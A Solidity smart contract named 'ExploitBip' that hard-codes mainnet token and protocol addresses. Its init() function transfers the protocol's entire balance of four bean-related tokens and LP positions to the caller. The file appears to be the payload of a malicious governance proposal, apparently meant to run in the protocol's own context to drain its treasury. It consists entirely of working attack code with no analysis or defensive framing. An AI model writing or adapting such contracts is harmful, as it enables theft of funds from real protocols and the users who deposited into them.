// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;

interface IERC20 {
    function balanceOf(address) external view returns (uint);
    function transfer(address, uint) external;
}
contract ExploitBip {
    
    IERC20 private constant beans = IERC20(0xDC59ac4FeFa32293A95889Dc396682858d52e5Db);
    IERC20 private constant beans3Crv = IERC20(0x3a70DfA7d2262988064A2D051dd47521E43c9BdD);
    IERC20 private constant beansLusd = IERC20(0xD652c40fBb3f06d6B58Cb9aa9CFF063eE63d465D);
    IERC20 private constant beansWethPair = IERC20(0x87898263B6C5BABe34b4ec53F22d98430b91e371);
    
    address private constant beansProtocol = 0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5;

    function init() external {
        uint beansBalance =  beans.balanceOf(beansProtocol);
        if(beansBalance > 0) {
            beans.transfer(msg.sender, beansBalance);
        }

        uint beans3CrvBalance = beans3Crv.balanceOf(beansProtocol);
        if(beans3CrvBalance > 0) {
            beans3Crv.transfer(msg.sender, beans3CrvBalance);
        }

        uint beansLusdBalance = beansLusd.balanceOf(beansProtocol);
        if(beansLusdBalance > 0) {
            beansLusd.transfer(msg.sender, beansLusdBalance);
        }

        uint beansWethLpBalance = beansWethPair.balanceOf(beansProtocol);
        if(beansWethLpBalance > 0) {
            beansWethPair.transfer(msg.sender, beansWethLpBalance);
        }
    }
}